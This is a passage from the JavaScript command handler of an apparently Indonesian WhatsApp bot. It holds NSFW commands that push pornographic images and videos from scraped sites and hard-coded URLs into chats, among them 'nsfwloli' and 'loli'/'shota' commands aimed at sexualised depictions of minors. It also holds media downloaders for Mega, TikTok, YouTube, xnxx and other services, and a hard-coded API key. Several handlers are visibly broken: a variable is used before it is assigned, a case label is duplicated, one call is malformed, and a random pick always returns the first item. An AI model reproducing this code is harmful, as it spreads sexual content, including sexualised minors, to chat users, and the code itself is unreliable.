znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'blowjob':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/blowjob.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'cuckold':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/cuckold.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'cum':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/cum.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'eba':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/eba.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'ero':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/ero.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'femdom':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/femdom.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'foot':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/foot.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'gangbang':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/gangbang.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'glasses':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/glasses.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'hentai':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/hentai.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'jahy':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/jahy.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'manga':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/manga.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'masturbation':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/masturbation.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'neko-hentai':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/neko.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/neko2.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'nsfwloli':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/nsfwloli.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'orgy':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/orgy.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'panties':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/panties.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'pussy':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/pussy.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'tentacles':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/tentacles.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'thights':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/thights.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'yuri':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/yuri.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'zettai':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/zettai.json'))
var znnyresult = pickRandom(ahegaonsfw)
znn.sendMessage(m.chat, { caption: "don banj, follow saluran znn", image: { url: znnyresult.url } }, { quoted: m })
break
case 'gifblowjob':
reply('matte kudasai (눈‸눈)')
  let assss =  await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff =  fetchBuffer(assss.data.url)
    var bogif =  buffergif(bobuff)
     znn.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./znnProject/nsfw/gifs.json'))
var znnyresultx = pickRandom(ahegaonsfw)
     znn.sendMessage(m.chat,{video:znnyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
reply('matte kudasai (눈‸눈)')
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)];
    if (/gifs/.test(command)) heyy =  fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy =  fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
znn.sendMessage(m.chat, { image: { url: yeha }, caption : "don banj, follow saluran znn" }, { quoted: m })
}
break

































// FITUR DOWNLOAD
case 'megadl':
const { File } = require('megajs')
const { fileTypeFromBuffer } = require('file-type')
znn.room = znn.room ? znn.room : {}
if (!args[0]) return reply795(`Masukan Url!\n\nContoh :\n${prefix + command} https://mega.nz/file/FltHDCzD#oNm8SD_e9oFTCczmnEW4zB9gsakSGzVaVtd9euj7yK8`)
let asw = 'mega_' + m.sender
if (asw in znn.room) return reply('Kamu Masih Mendownload!')
znn.room[asw] = true
var file = File.fromURL(args[0])
reply(mess.wait)
try {
file = await file.loadAttributes()
var data = await file.downloadBuffer()
var mimetype = await fileTypeFromBuffer(data)
await znn.sendMessage(m.chat, { document: data, fileName: file.name, mimetype }, { quoted: m })
} catch (e) {
console.log(e)
throw 'Internal Error'
} finally {
delete znn.room[asw]
}
break
case 'capcutdl': case 'capcut':
if (!text) throw `Linknya?\nExample: *.${command} https://www.capcut.com/template-detail/7254579764793511170?template_id=7254579764793511170&share_token=50c68e86-b857-40d7-9056-6c5db8b37c4c&enter_from=template_detail&region=ID&language=in&platform=copy_link&is_copy_link=1*`
reply(mess.wait)
  let res = await fetch(`https://aemt.me/download/capcut?url=${text}`)
  let json = await res.json()
  let v = json.result
  let cap = `Suksess Download Media`
znn.sendMessage(m.chat, { video: { url: v.video_ori }, caption: cap }, m)
break
case 'git': case 'gitclone':
if (!args[0]) return reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/znn/Project-znn`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
var url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
znn.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
.catch(console.error)
break
case 'happymod':{
if (!q) return reply(`Example ${prefix+command} Sufway surfer mod`)
reply(mess.wait)
let kat = await scp2.happymod(q)
reply(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return reply(`Enter the Google Drive link`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply795(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	znn.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
break
case "fbdl2":
{
await loading()
fetchJson(`https://oni-chan.my.id/api/download/facebook?url=${args[0]}`).then(res => {
znn.sendMessage(from, {video: {url: res.videoUrl}, caption: `Title: ${res.title}\n\n`}, {quoted: fcall})
})
}
break
case 'igdl':
{
if(!text) return reply('masukan link')
getingit(text.then(res => {
znn.sendMessage(from, {video: {url: res.url[0].url}}, {quoted:m})
reply795(`*⏤͟͟͞͞ᵡ INSTAGRAM DOWNLOADER*\n\nTitle: ${res.meta.title}\n\nURL: ${res.meta.source}\nWEB: ${res.hosting}\n\nMedia sedang dikirim...\n\n-$1000`)}))
}
break
           case 'fb':
           case 'fbdl': {
           if (!args[0]) {
    return reply(`Kirim link video dari Facebook\n\nExample :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return reply('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    znn.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    reply('Maybe private video!')
  }
  }
  break
case 'terabox': case 'tbdl':
if (!isPremium && !isOwner)
if (!text) return reply('input the link!')
await terabox(text)
break
case 'mediafire': {
	if (args.length == 0) return reply795(`*Gunakan Dengan*\n  Example : .mediafire https://mediafire.com`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`Link Mungkin Expired!`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 1000) return reply('Oops, znn Tidak Mampu Mendownloadnya :^(')
	const result4 = `*DOWNLOADER MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
reply(`${result4}`)
znn.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'spotifydl':{
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://open.spotify.com/track/6cHCixTkEFATjcu5ig8a7I`)
reply(mess.wait)
let anu = await fetchJson(`https://api.nomisec07.site/api/spotify?url=${text}`)
const aud = anu.data.url
znn.sendMessage(m.chat, {
audio: {
url: aud
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: anu.data.title,
body: "",
thumbnailUrl: anu.data.thumbnail,
sourceUrl: audioUrl,
mediaType: 1,
showAdAttribution: false,
renderLargerThumbnail: true
}
}
}, {
quoted: floc
});
}
break
case 'play':{
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let wait = await znn.sendMessage(m.chat, {text: `_Searching.. [ ${text} ] 🔍_`}, {quoted: m, ephemeralExpiration: m.expiration})
let search = await yts(`${text}`)

let data = await search.all.filter((v) => v.type == 'video')
try {
var res12 = data[0]
} catch {
var res12 = data[1]
}
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./.npm/${search.all[0].views}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
await znn.sendMessage(m.chat, {text: `_Mengirim.. [ ${text} ] 🔍_`, edit: wait.key }, {quoted: m, ephemeralExpiration: m.expiration});
znn.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {title: `${search.all[0].title}`, body: `Views : ${search.all[0].views}`, thumbnailUrl: res12?.thumbnail, mediaType: 2, mediaUrl: `${search.videos[0].url}`, sourceUrl: `${search.videos[0].url}`, renderLargerThumbnail: true }}},)
   })
const znnvidoh = require('./lib/ytdl2')
const vid=await znnvidoh.mp4(`${search.videos[0].url}`)
const ytc=`
*Tittle:* ${vid.title}
*Date:* ${vid.date}
*Duration:* ${vid.duration}
*Quality:* ${vid.quality}`
await znn.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},)
}
znn.sendMessage(m.chat, {react: {text: '🎧', key: m.key}})
break //Powered By znn & znn // Powered By Winn
case 'ytplay': case 'ytdl': {
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let search = await yts(`${text}`)
let caption = `*SUBSCRIBE YT WIN*

⎙ ID : ${search.all[0].videoId}
♽ Title : ${search.all[0].title}
♽ Views : ${search.all[0].views}
♽ Duration : ${search.all[0].timestamp}
♽ Channel : ${search.all[0].author.name}
♽ Upload : ${search.all[0].ago}
♽ URL Video : ${search.videos[0].url}`
let todd2 = await getBuffer(search.all[0].image)
znn.sendMessage(m.chat, {image: todd2, caption: caption}, {quoted:m})
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./.npm/${search.all[0].title}.mp3`
let nana = ytdl(ply, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3file))
.on('finish', async () => {
znn.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg', ptt: true }, m)
})
}
break //Powered By znn & znn
case'ytdok': {
if (!text) throw `Example: ${prefix + command} https://youtu.be/B6pn7E8ecxg?si=okL1ZNjdititvtvf`
let anu = await bochil.youtubedl(text)
let data = await anu.audio['128kbps'].download()
if (anu.audio['128kbps'].fileSize > 10000) return reply(`Ukuran melebihi batas maksimal 10 MB\n\n*link download*\n${data}`)
znn.sendMessage(m.chat, anu.thumbnail, `⭔ title : ${anu.title}\n⭔ quality : ${anu.audio['128kbps'].quality}\n⭔ file size hd : ${anu.audio['128kbps'].fileSizeH}\n⭔ file size : ${anu.audio['128kbps'].fileSize}\n⭔ source url : ${q}`,)
znn.sendMessage(m.chat, { document: { url: data }, mimetype: 'audio/mp4', fileName: `${anu.title}.mp3`}, )
}
break //Powered By znn & znn
case'ytvn': {
if (!text) throw `Example: ${prefix + command} https://youtu.be/B6pn7E8ecxg?si=okL1ZNjdititvtvf`
let anu = await bochil.youtubedl(text)
let data = await anu.audio['128kbps'].download()
if (anu.audio['128kbps'].fileSize > 10000) return reply(`Ukuran melebihi batas maksimal 10 MB\n\n*link download*\n${data}`)
znn.sendMessage(from, anu.thumbnail, `⭔ title : ${anu.title}\n⭔ quality : ${anu.audio['128kbps'].quality}\n⭔ file size hd : ${anu.audio['128kbps'].fileSizeH}\n⭔ file size : ${anu.audio['128kbps'].fileSize}\n⭔ source url : ${q}`,)
znn.sendMessage(m.chat, { audio: { url: data }, mimetype: 'audio/mp4', ptt: true, fileName: `${anu.title}.mp3`}, )
}
break //Powered By znn & znn
case 'ytvideo':
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let wait = await znn.sendMessage(m.chat, {text: `_Searching.. [ ${text} ] 🔍_`}, {quoted: m, ephemeralExpiration: m.expiration})
let search = await yts(`${text}`)
const znnvidoh = require('./lib/ytdl2')
const vid=await znnvidoh.mp4(`${search.videos[0].url}`)
const ytc=`
*Tittle:* ${vid.title}
*Date:* ${vid.date}
*Duration:* ${vid.duration}
*Quality:* ${vid.quality}`
var ppt = await prepareWAMessageMedia({ video: {url:vid.videoUrl}}, { upload: znn.waUploadToServer })
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({"ptvMessage": ppt.videoMessage, caption: `done banh`, fileLength: 9999999999 }), { userJid: from})
znn.relayMessage(from, ptv.message, { messageId: ptv.key.id })
await znn.sendMessage(m.chat,{
    text: ytc
})

await znn.sendMessage(m.chat, {text: `_Mengirim.. [ ${text} ] 🔍_`, edit: wait.key }, {quoted: m, ephemeralExpiration: m.expiration});
break
case 'ytmp4': {
if (!isGroup) return onlyGroup()
const znnvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !znnvidoh.isYTUrl(text)) reply(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await znnvidoh.mp4(text)
const ytc=`
*Tittle:* ${vid.title}
*Date:* ${vid.date}
*Duration:* ${vid.duration}
*Quality:* ${vid.quality}`
await znn.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'ytmp3': case 'youtubemp3': {
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
reply('memuat...')
downloadMp3(text)
}
break
case 'tiktok': case 'ttdl':
if (!q) return reply('Masukkan linknya!')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply("Masukkan link tiktok dengan benar!")
onlyWait()
await TikTok(args[0]).then(async res => {
let tav = `Title : ${res.title}
Author : ${res.author}`
await znn.sendMessage(from, {audio: {url: res.audio}, mimetype: 'audio/mpeg', ptt: false})
await znn.sendMessage(from, {video: {url: res.nowm}, caption: tav})
}).catch((err) => reply('Maaf erjadi Kesalahan!'))
break //Powered By znn & znn
case'xnxxdl':
{
if (!text) return reply(`*Gunakan Dengan*\n\nexample : ${prefix+command} linknya`)
let anu = await fetchJson(`https://skizo.tech/api/xnxxdl?urlxnxx=${text}&apikey=${global.skizo}`)
const cpt = anu.title
const nick = anu.quality
znn.sendMessage(m.chat, { video: { url: anu.url}, caption: `*TITLE* : ${cpt}\n*QUALITY* : ${nick}`}, )
}
break






































// FITUR BARU






























// FITUR AUDIO
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
reply('tunggu sebentar')
let media = await znn.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
znn.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break














































// FITUR NSFW
case 'hentaisearch':
if (!text) throw '*[ Wrong ]* please input query'
reply(mess.wait)
let searchResults = await searchHentai(text)
var memek = searchResults.result.map((v, i) => `*${i + 1}.* ${v.title}
Views : ${v.views}
Link : ${v.url}`).join('\n')
let randomThumbnail
if (searchResults.result.length > 0) {
let randomIndex = Math.floor(Math.random() * searchResults.result.length)
randomThumbnail = searchResults.result[randomIndex].thumbnail
znn.sendMessage(from, {image: {url:randomThumbnail}, caption:memek},{quoted:fpayment2})
} else {
//randomThumbnail = 'https://pictures.hentai-foundry.com/e/Error-Dot/577798/Error-Dot-577798-Zero_Two.png'
elorr = '*[ Error ]* hasil tidak ada'
}
break

case 'pornhubgif':{
if (!text) return m.reply("Input query")
try {
let res = await searchGif(text)
let teks = res.map((item, index) => {
return `*[ RESULT ${index + 1} ]*
*Title:* ${item.title}
*Url:* ${item.url}
*Webm:* ${item.webm}
`
}).filter(v => v).join("\n________________________\n")
await reply795(teks)
} catch (e) {
}}
break
case 'pornhubvid':
if (!text) return m.reply("Input query")
try {
let res = await searchVideo(text)
let teks = res.map((item, index) => {
    return `*[ RESULT ${index + 1} ]*
*Link :* ${item.link}
*Title :* ${item.title}
*Uploader :* ${item.uploader}
*Views :* ${item.views}
*Duration :* ${item.duration}
`
}).filter(v => v).join("\n")
await reply795(teks)
} catch (e) {
await m.reply(eror)
}
break
case 'bokep': case 'hentaivid2': {
if (!isCreator && !isOwner && !isPremium) return reply(mess.owner)
reply(mess.wait)
let sbe = await hentaivid()
let cejd = sbe[Math.floor(Math.random(), sbe.length)]
znn.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
case 'hentaivid': case 'hentaivideo': {
if (!isCreator && !isOwner && !isPremium) return reply(mess.owner)
reply('cotto matte kudasaii')
const { hentai } = require('./lib/scraperr.js')
let anu = await hentai()
let result912 = anu[Math.floor(Math.random(), anu.length)]
znn.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `Title : ${result912.title}\nCategory : ${result912.category}\nMimetype : ${result912.type}\nViews : ${result912.views_count}\nShares : ${result912.share_count}\nSource : ${result912.link}\nMedia Url : ${result912.video_1}` }, { quoted: m })
}
break
case 'paptt':
if(!isGroup) return onlyGroup()
if (!q) return reply(`Example ${prefix + command} foto/video`)
let papttfoto = JSON.parse(fs.readFileSync('./database/foto.json'))
let papttvideo = JSON.parse(fs.readFileSync('./database/video.json'))
let titid1 = (pickRandom(papttfoto))
let titid2 = (pickRandom(papttvideo))
if (q == 'foto') {
reply("Foto Akan Dikirim Lewat Private Chat")
znn.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: m })
} else if (q == 'video') {
reply("Video Akan Dikirim Lewat Private Chat")
znn.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Kiamat sudah dekat'})
}
break
case 'art':
case 'awoo':
case 'bts':
case 'cogan':
case 'elaina2':
case 'exo':
case 'elf':
case 'estetic':
case 'kanna':
case 'loli':
case 'neko':
case 'waifu':
case 'shota':
case 'husbu':
case 'sagiri':
case 'shinobu':
case 'megumin':
case 'wallnime':
case 'quotesimage':
if (!isGroup) return onlyGroup()
znn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=haikalgans` } })
break //Powered By znn & znn
case 'bokep1':
let ntahlah1 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2022/08/Brigitte-fucked-at-the-gym.mp4`)
znn.sendMessage(from, { video: ntahlah1, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep2':
let ntahlah2 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
znn.sendMessage(from, { video: ntahlah2, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep3':
let ntahlah3 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
znn.sendMessage(from, { video: ntahlah3, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep4':
let ntahlah4 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
znn.sendMessage(from, { video: ntahlah4, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep5':
let ntahlah5 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
znn.sendMessage(from, { video: ntahlah5, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep6':
let ntahlah6 = await getBuffer(`https://media.discordapp.net/attachments/632434742427516948/1055565623914147910/GrandLiveDinosaur.mp4`)
znn.sendMessage(from, { video: ntahlah6, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep7':
let ntahlah7 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
znn.sendMessage(from, { video: ntahlah7, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep8':
let ntahlah8 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
znn.sendMessage(from, { video: ntahlah8, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep9':
let ntahlah9 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
znn.sendMessage(from, { video: ntahlah9, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep10':
let ntahlah10 = await getBuffer(`https://www.pornhub.com/view_video.php?viewkey=ph62dacb17ee77a`)
znn.sendMessage(from, { video: ntahlah10, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep11':
let ntahlah11 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
znn.sendMessage(from, { video: ntahlah11, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep12':
let ntahlah12 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
znn.sendMessage(from, { video: ntahlah12, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep13':
let ntahlah13 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
znn.sendMessage(from, { video: ntahlah13, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep14':
if (!isGroup) return onlyGroup()
let ntahlah14 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
znn.sendMessage(from, { video: ntahlah14, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep15':
if (!isGroup) return onlyGroup()
let ntahlah15 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
